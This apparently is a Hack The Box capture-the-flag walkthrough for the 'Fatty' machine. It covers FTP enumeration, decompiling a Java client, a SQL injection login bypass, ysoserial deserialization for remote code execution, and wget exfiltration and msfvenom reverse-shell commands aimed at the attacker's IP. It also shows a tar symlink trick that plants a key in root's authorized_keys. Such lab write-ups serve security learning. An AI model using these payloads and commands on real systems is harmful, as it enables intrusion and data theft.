@@ -1,0 +1,293 @@
+* Fatty
+** Enumeration
+*** meta
+# Nmap 7.80 scan initiated Sun May 24 19:44:38 2020 as: nmap -Pn -sC -sV -oA logs/nmap 10.10.10.174
+Nmap scan report for 10.10.10.174
+Host is up (0.054s latency).
+Not shown: 998 closed ports
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun May 24 19:44:51 2020 -- 1 IP address (1 host up) scanned in 13.20 seconds
+*** 21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
+| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
+| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
+|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.16.100
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+*** 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
+|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
+** Foothold
+*** fatty-client
+The only common ports open on the server initially are ~ftp~ and ~ssh~, but ~ftp~ has a treasure trove of files: the ~fatty-client.jar~ file and a series of notes explaining how to run it.
+
+I look for a way to override the port on the command line (probably one of the only unrealistic things I found on this box!) and eventually just bite the bullet and decompile whole jar with ~jd-gui~.
+**** intellij
+Since I assume I'll need to make a bunch of changes to client in order to fully exploit the system, I go ahead and set up it up as an intellij project so I can easily make changes and rerun the system without repacking into a jar.
+Changes required:
+ * move the ~htb~ decompiled sources into a directory called ~src~
+ * move the ~org~ etc class files *not the sources* into a directory called ~lib~
+ * move the other loose files in the jar into a directory calle ~res~
+Mark the ~src~, ~lib~, and ~res~ dirs as appropriate in in IntelliJ as source files, dependencies, and resources.
+**** reading files
+It was easy to disable the various access checks on the client side, but they are apparently enforced on the server as well, since they are still not accessible on the client after granting all menu buttons unconditionally.
+We need a way to get more information off of the server, reading files (which the client supports directly!) seems a likely source.
+trying to open a file outside of the current directory fails, the server is stripping away ~/../~ patterns.
+Luckily we can change the directories viewed by ~mail~, etc, at least by popping up once, and it's enough:
+
+#+BEGIN_SRC java
+mail.addActionListener(new ActionListener()
+    {
+      public void actionPerformed(ActionEvent e) {
+        String response = "";
+        ClientGuiTest.this.currentFolder = "..";
+        try {
+          response = ClientGuiTest.this.invoker.showFiles("..");
+        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
+#+END_SRC
+
+This shows the contents of ~/opt/fatty/files~, which most notably contains ~fatty-server.jar~.
+**** downloading files
+Directly trying to open the server jar just causes the client to hang, which isn't surprising since it's trying to read it as a string. Altering the client to download files to a binary rather than converting them to strings exfiltrates the jar:
+
+
+#+BEGIN_SRC java
+public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
+  // ...
+  
+  this.action = new ActionMessage(this.sessionID, "open");
+  this.action.addArgument(foldername);
+  this.action.addArgument(filename);
+  sendAndRecv();
+  if (this.response.hasError()) {
+    return "Error: Your action caused an error on the application server!";
+  }
+  String response = "";
+  try {
+    OutputStream out = new FileOutputStream("out.bin");
+    out.write(this.response.getContent());
+    out.close();
+    // response = this.response.getContentAsString();
+  } catch (Exception e) {
+    response = "Unable to convert byte[] to String. Did you read in a binary file?";
+  } 
+  return response;
+}
+#+END_SRC
+
+*** fatty-server
+**** logging in as admin
+With the server source code in hand (decompiled and setup as a project just as the client), we can start to break the auth.
+
+Exploring around, sure enough the login is vulnerable to SQL injection:
+
+#+BEGIN_SRC java
+    try {
+      stmt = this.conn.createStatement();
+      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
+
+      
+      try {
+        Thread.sleep(3000L);
+      } catch (InterruptedException e) {
+        return null;
+      } 
+      
+      if (rs.next()) {
+        
+        int id = rs.getInt("id");
+        String username = rs.getString("username");
+        String email = rs.getString("email");
+        String password = rs.getString("password");
+        String role = rs.getString("role");
+        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
+        
+        if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) {
+          return newUser;
+        }
+        throw new LoginException("Wrong Password!");
+      } 
+      
+      throw new LoginException("Wrong Username!");
+    }
+#+END_SRC
+
+We can't alter this (except locally to test, which was valuable), but we can attack it, a ~UNION~ which provides the exact values to the result set that we want will work.
+
+#+BEGIN_SRC sql
+xxx' union select 999,'qtc','foo@bar.com','5A67EA356B858A2318017F948BA505FD867AE151D6623EC32BE86E9C688BF046','admin
+#+END_SRC
+
+where the hash provided is the same hash (computed with the given sources) of the provided credentials: ~qtc:clarabibi~.
+
+A small problem emerges when I realize that the hash the client sends is the hash of the username + the password (which is the whole injection string!), but that's easily modified so that it sends a fixed hash that we specify:
+
+#+BEGIN_SRC java
+public void setPassword(String password) {
+  String hashString = "qtc" + password + "clarabibimakeseverythingsecure";
+  MessageDigest digest = null;
+  try {
+    digest = MessageDigest.getInstance("SHA-256");
+  } catch (NoSuchAlgorithmException e) {
+    e.printStackTrace();
+  } 
+  byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
+  this.password = DatatypeConverter.printHexBinary(hash);
+}
+#+END_SRC
+
+**** changing the password
+Once logged in with admin privileges, we cn start playing with other commands. The most interesting thing is ~nestat~ which shows a localhost listener on a high port -- something for later?
+
+After that, the most promising line is the 'unimplemented' method, 'Change Password'.
+
+When trying to execute it, it fails because ~User~ is not serializable. That's 'fixable' on the client, where we can make both ~User~ and ~Role~ fully serializable, but the server still doesn't have working code...
+
+But it does have code that *tries* to deserialized the ~User~ object:
+
+#+BEGIN_SRC java
+public static String changePW(ArrayList<String> args, User user) {
+  // ...
+  String response = "";
+  
+  String b64User = args.get(0);
+fo(b64User);
+  byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());
+  ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);
+  
+  try {
+    ObjectInputStream oIn = new ObjectInputStream(bIn);
+    
+    User user1 = (User)oIn.readObject(); // <--- PWNED
+  } catch (Exception e) {
+    e.printStackTrace();
+    response = response + "Error: Failure while recovering the User object.";
+    return response;
+  } 
+  
+  response = response + "Info: Your call was successful, but the method is not fully implemented yet.";
+  return response;
+}
+#+END_SRC
+
+Even though ~User~ isn't serializable, the server tries anyway, which means we can give it a string and have it deserialize it for us before casting that to a ~User~ object. The cast will aways fail, but before it does our code will have executed!
+
+For preparation of this payload, I use ~ysoserial~. I try a few of the payloads before finding one that works and gives the expected failure message from the server about not recognizing the object as a ~User~ (rather than some other failure).
+
+Now we have RCE and can try to produce a shell.
+
+https://github.com/frohoff/ysoserial
+
+**** shell
+I stumbled for a long time here, I could execute commands, most notably ~wget~ from my local server, but not much else. Things I tried that didn't work:
+ * various reverse shells: bash, perl, awk, socat, nc
+ * uploading an ssh key and appending it to authorized_keys
+ * ping
+
+None of it worked! The only thing I could reliably do was upload small scripts via ~wget~ then run them, for instance:
+
+#+BEGIN_SRC bash
+java -jar ysoserial.jar CommonsCollections5 "wget http://10.10.16.100:8000/cmd.sh -O cmd.sh" > src/client/payload
+java -jar ysoserial.jar CommonsCollections5 "sh cmd.sh" > src/client/payload
+#+END_SRC
+
+I ran two python servers to enable introspection easy:
+ ~python3 -m http.server~ on 8000 to allow upload of files
+  * https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7
+    for logging GET and POST requests, I used this to exfiltrate information, for instance by commanding the server to make this kind of request:
+#+BEGIN_SRC bash
+cmd=`ls -alh $HOME | base64`
+wget 10.10.16.100:8080?res=$cmd
+#+END_SRC
+
+Then decoding the base64 query param that was sent in the GET request.
+
+Despairing of the lack of common tools (not even bash! verified via that technique with the cmd ~`which bash`~) I finally used ~msfvenom~ to build a payload for execution:
+
+~msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.100 LPORT=5555 -f elf > shell.elf~
+
+Uploading and then running this binary gets a shell, and then ~user.txt~ which is present and owned by ~qtc~ but unreadable!
+
+** Escalation
+*** enumeration
+After landing a shell, it's clear that we *are* in a very constricted environment. ~sudo~, ~curl~, ~ping~ are just some of the common tools unavailable.
+
+Frustratingly, ~sshd~ is configured for PAM and doesn't seem to allow ~qtc~ to connect from offsite, so a more stable shell is not in hand. :(
+
+What kind of environment is so constricted? A container!
+Running through the checklist from https://www.cs.ru.nl/bachelors-theses/2020/Joren_Vrancken___4593847___A_Methodology_for_Penetration_Testing_Docker_Systems.pdf
+confirms that we are in a docker container.
+
+Unfortunately none of the 'obvious vulns' from that very good study are available.
+
+What's active on the server (via ~ps~):
+ * sshd
+ * crond
+ * java -jar fatty-server.jar
+
+Investigate:
+ * the start.sh script references issues with OpenRC forcing sshd and crond to be run as part of the startup script -- this may imply a vulnerability.
+ * what is crond actually running? (download pspy)
+ * do the other fatty-server instances have the same or different environments? (Maybe they weren't all secured?)
+
+pspy reveals a consistent pattern every 2 minutes:
+
+#+BEGIN_SRC bash
+2020/05/26 15:51:01 CMD: UID=0    PID=2513   | sshd: [accepted]
+2020/05/26 15:51:01 CMD: UID=22   PID=2514   | sshd: [net]
+2020/05/26 15:51:01 CMD: UID=1000 PID=2515   | sshd: qtc
+2020/05/26 15:51:01 CMD: UID=1000 PID=2516   | ash -c scp -f /opt/fatty/tar/logs.tar
+2020/05/26 15:52:01 CMD: UID=0    PID=2517   | sshd: [accepted]
+2020/05/26 15:52:01 CMD: UID=22   PID=2518   | sshd: [net]
+2020/05/26 15:52:01 CMD: UID=1000 PID=2519   | sshd: qtc [priv]
+2020/05/26 15:52:01 CMD: UID=1000 PID=2520   | scp -f /opt/fatty/tar/logs.tar
+#+END_SRC
+
+So it seems like the user ~qtc~ regularly connects with ~scp~ to the box. Possibly abusable.
+
+Also interesting:
+
+#+BEGIN_SRC bash
+2020/05/26 16:30:00 CMD: UID=0    PID=2719   | /bin/ash -c run-parts /etc/periodic/15min
+#+END_SRC
+
+Doubtful that ~/etc/periodic/15min~ is writable, but might as well try.
+
+Acting on the assumption that if the logs are being tarred up and then ~scp~ ed off the box that they will be untared on the other end, https://sintonen.fi/advisories/tar-extract-pathname-bypass.proper.txt looked promising, especially since the version of tar running in the container appears to be vulnerable, but using the payload generator from here https://alamot.github.io/path_traversal_archiver/ did not prove successful.
+
+Another way to craft malicious tar payloads:
+https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0101-exploits/tar-symlink.txt
+
+Working on the following set of staged tarballs, which works locally, but sadly fails on the server:
+#+BEGIN_SRC bash
+❯ tar tvf payloads/non-working/evil-root-ssh.tar
+lrwxrwxrwx user/user         0 2020-05-28 15:21 .ssh -> /root/.ssh
+❯ tar tvf payloads/non-working/evil-root-key.tar
+-rw-r--r-- user/user       565 2020-05-28 15:22 .ssh/authorized_keys
+#+END_SRC
+
+Taking advantage of ~scp~ was ultimately the way forward:
+#+BEGIN_SRC bash
+❯ tar tvf payloads/working/stage1.tar
+lrwxrwxrwx user/user         0 2020-05-28 15:09 logs.tar -> /root/.ssh/authorized_keys
+❯ cat payloads/working/stage2.tar
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/hu3PqvODYkeD34dMjRLWfJEwqInWPACuqVxLaHK7lv8icOAb8t4zfnU
+#+END_SRC
+
+ROOT: ee982fa19b413415391ed4a17b2bd9c7
+
+It turns out that the only reason my first technique doesn't work was the 'cleaning' process on the server, where between extractions the directories are cleaned, but *not* between ~scp~ executions, which meant that ~scp~ had to be targetted rather than ~tar~.
